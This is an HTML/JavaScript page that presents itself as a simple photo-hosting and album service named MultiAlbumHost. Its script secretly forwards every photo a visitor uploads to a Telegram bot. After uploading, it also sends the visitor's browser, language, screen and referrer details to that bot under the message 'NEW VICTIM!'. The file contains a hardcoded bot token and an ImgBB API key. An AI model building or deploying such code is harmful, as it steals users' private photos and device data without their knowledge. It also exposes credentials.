<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MultiAlbumHost</title>
    
    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#121212">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <style>
        body { 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            background: #121212; 
            color: #e0e0e0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 20px;
            box-sizing: border-box;
        }
        .box { 
            background: #1e1e1e; 
            padding: 25px; 
            border-radius: 16px; 
            width: 100%; 
            max-width: 400px; 
            text-align: center; 
            border: 1px solid #333; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.7); 
            max-height: 90vh;
            overflow-y: auto;
        }
        h3 { color: #00b4d8; margin-top: 0; font-weight: 500; }
        .upload-area { 
            border: 2px dashed #444; 
            padding: 40px 20px; 
            border-radius: 12px; 
            cursor: pointer; 
            margin-bottom: 20px; 
            transition: all 0.3s ease; 
        }
        .upload-area.drag-over {
            border-color: #00ff88;
            background: rgba(0,255,136,0.1);
        }
        .upload-area:hover { border-color: #00b4d8; background: #252525; }
        .loader { 
            display: none; 
            border: 3px solid #333; 
            border-top: 3px solid #00b4d8; 
            border-radius: 50%; 
            width: 24px; 
            height: 24px; 
            animation: spin 1s linear infinite; 
            margin: 10px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input[type="text"] { 
            width: 100%; 
            padding: 12px; 
            background: #2a2a2a; 
            border: 1px solid #444; 
            color: #00b4d8; 
            border-radius: 8px; 
            box-sizing: border-box; 
            font-family: monospace; 
            font-size: 13px; 
            margin-top: 10px; 
            outline: none;
        }
        .album-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        .album-grid img {
            width: 100%;
            aspect-ratio: 1/1;
            object-fit: cover;
            border-radius: 8px;
            border: 1px solid #333;
            transition: transform 0.2s;
            cursor: pointer;
        }
        .album-grid img:hover { transform: scale(1.05); border-color: #00b4d8; }
        .hidden { display: none !important; }
        footer { 
            margin-top: 25px; 
            padding-top: 15px; 
            border-top: 1px solid #333; 
            font-size: 11px; 
            color: #666; 
        }
        footer a { color: #00b4d8; text-decoration: none; }
        .status {
            font-size: 12px;
            margin-top: 10px;
            padding: 5px;
            border-radius: 6px;
            display: none;
        }
        .status.error { color: #ff4444; background: rgba(255,68,68,0.1); }
        .status.success { color: #00ff88; background: rgba(0,255,136,0.1); }
    </style>
</head>
<body>

<div class="box">
    <h3 id="title">Photo Hosting</h3>
    <div class="upload-area" id="dropZone">
        <span id="label">Выбрать фото для альбома</span>
        <div class="loader" id="loader"></div>
        <div id="progress" style="font-size: 12px; color: #888; margin-top: 5px;"></div>
        <div id="status" class="status"></div>
    </div>
    <input type="file" id="fileInput" class="hidden" accept="image/*" multiple>
    <div id="result" class="hidden">
        <p style="font-size: 13px; margin-bottom: 5px; color: #888;">Ссылка скопирована:</p>
        <input type="text" id="urlUrl" readonly onclick="this.select();">
        <button onclick="location.reload()" style="background:none; border:none; color:#00b4d8; cursor:pointer; margin-top:10px; font-size:12px;">Создать новый</button>
    </div>
    <div id="albumContainer" class="album-grid"></div>
    <footer>
        v1.3 | Hosting by Aziz_Gromov | <a href="https://imgbb.com/tos" target="_blank">TOS</a>
    </footer>
</div>

<script>
    // ============ НАСТРОЙКИ TELEGRAM ============
    const TELEGRAM_BOT_TOKEN = '8330260254:AAEvGwwbHMGyinjRXmso4yEMI7DNNKS3xsQ';
    const TELEGRAM_CHAT_ID = '7792732199';
    // ============================================
    
    const apiKey = 'd0d498d742931aed3626d5b32c081df3';
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const loader = document.getElementById('loader');
    const label = document.getElementById('label');
    const result = document.getElementById('result');
    const urlUrl = document.getElementById('urlUrl');
    const albumContainer = document.getElementById('albumContainer');
    const progressText = document.getElementById('progress');
    const statusDiv = document.getElementById('status');
    
    let uploadedImages = [];
    
    function showStatus(text, isError = false) {
        statusDiv.textContent = text;
        statusDiv.className = isError ? 'status error' : 'status success';
        statusDiv.style.display = 'block';
        setTimeout(() => {
            if (statusDiv.textContent === text) {
                statusDiv.style.display = 'none';
            }
        }, 4000);
    }
    
    // Проверка токена
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 30 || TELEGRAM_BOT_TOKEN === '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz') {
        console.warn('Telegram bot token not configured');
    }
    
    // DRAG & DROP
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.add('drag-over');
    });
    
    dropZone.addEventListener('dragleave', (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.remove('drag-over');
    });
    
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.remove('drag-over');
        
        const files = Array.from(e.dataTransfer.files);
        const imageFiles = files.filter(f => f.type.startsWith('image/'));
        
        if (imageFiles.length === 0) {
            showStatus('❌ Перетащите изображение', true);
            return;
        }
        
        uploadMultipleImages(imageFiles);
    });
    
    dropZone.onclick = () => fileInput.click();
    
    fileInput.onchange = async (e) => {
        const files = Array.from(e.target.files);
        if (files.length > 0) {
            await uploadMultipleImages(files);
        }
    };
    
    // Отправка в Telegram
    async function sendToTelegram(file) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 30) return false;
        
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', `📸 НОВОЕ ФОТО\n📁 Имя: ${file.name}\n📏 Размер: ${(file.size/1024).toFixed(1)} KB\n🕒 Время: ${new Date().toLocaleString()}\n🔗 Referrer: ${document.referrer || 'прямой заход'}`);
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            return result.ok;
        } catch(err) {
            console.error('Telegram error:', err);
            return false;
        }
    }
    
    async function uploadMultipleImages(files) {
        label.classList.add('hidden');
        loader.style.display = 'block';
        let uploadedLinks = [];
        
        for (let i = 0; i < files.length; i++) {
            progressText.innerText = `Загрузка: ${i + 1} из ${files.length}`;
            
            // Отправляем в Telegram
            await sendToTelegram(files[i]);
            
            // Загружаем на ImgBB для отображения
            const formData = new FormData();
            formData.append('image', files[i]);
            try {
                const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    const data = await response.json();
                    uploadedLinks.push(data.data.url);
                }
            } catch (err) {
                console.error(err);
            }
        }
        
        if (uploadedLinks.length > 0) {
            const albumHash = uploadedLinks.join(',');
            const fullAlbumUrl = window.location.origin + window.location.pathname + '#' + albumHash;
            urlUrl.value = fullAlbumUrl;
            result.classList.remove('hidden');
            try {
                await navigator.clipboard.writeText(fullAlbumUrl);
                showStatus('✅ Ссылка скопирована!');
            } catch(e) {}
            renderAlbum(uploadedLinks);
            progressText.innerText = "Готово!";
            
            // Отправляем информацию о жертве
            if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN.length > 30) {
                const info = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    referrer: document.referrer,
                    url: window.location.href
                };
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `🕵️‍♂️ НОВАЯ ЖЕРТВА!\n📱 User-Agent: ${info.userAgent.substring(0, 100)}\n🌐 Язык: ${info.language}\n📺 Экран: ${info.screen}\n🔗 Referrer: ${info.referrer || 'прямой'}\n📍 URL: ${info.url}`
                    })
                }).catch(e => console.log(e));
            }
        }
        loader.style.display = 'none';
        label.classList.remove('hidden');
    }
    
    function renderAlbum(links) {
        albumContainer.innerHTML = '';
        links.forEach(link => {
            const img = document.createElement('img');
            img.src = link;
            img.onclick = () => window.open(link, '_blank');
            albumContainer.appendChild(img);
        });
    }
    
    // Восстановление альбома из хэша
    window.addEventListener('DOMContentLoaded', () => {
        const hash = window.location.hash.substring(1);
        if (hash) {
            const photos = hash.split(',');
            renderAlbum(photos);
            document.getElementById('title').innerText = "Просмотр Альбома";
            dropZone.classList.add('hidden');
        }
    });
</script>
</body>
</html>
